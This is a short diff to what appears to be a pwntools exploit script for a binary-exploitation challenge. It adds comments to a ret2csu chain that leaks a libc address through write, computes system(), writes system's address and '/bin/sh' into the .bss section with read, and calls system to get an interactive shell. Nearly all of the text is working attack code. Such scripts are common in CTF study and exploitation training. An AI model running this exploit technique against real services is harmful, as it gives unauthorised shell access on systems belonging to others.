@@ -26,6 +26,7 @@ def csu(rbx: int, rbp: int, r12: int, r13: int, r14: int, r15: int, last: int):
 
 
 sh.recvuntil(b'Hello, World\n')
+# write(1, write_got, 8)
 csu(0, 1, write_got, 8, write_got, 1, main_addr)
 
 write_addr = u64(sh.recv(8))
@@ -35,9 +36,11 @@ system_addr = libc_base + libc.dump('system')
 log.success('system_addr ' + hex(system_addr))
 
 sh.recvuntil(b'Hello, World\n')
+# read(0, bss_base, 16)
 csu(0, 1, read_got, 16, bss_base, 0, main_addr)
 sh.send(p64(system_addr) + b'/bin/sh\x00')
 
 sh.recvuntil(b'Hello, World\n')
+# system(bss_base + 8)
 csu(0, 1, bss_base, 0, 0, bss_base + 8, main_addr)
 sh.interactive()
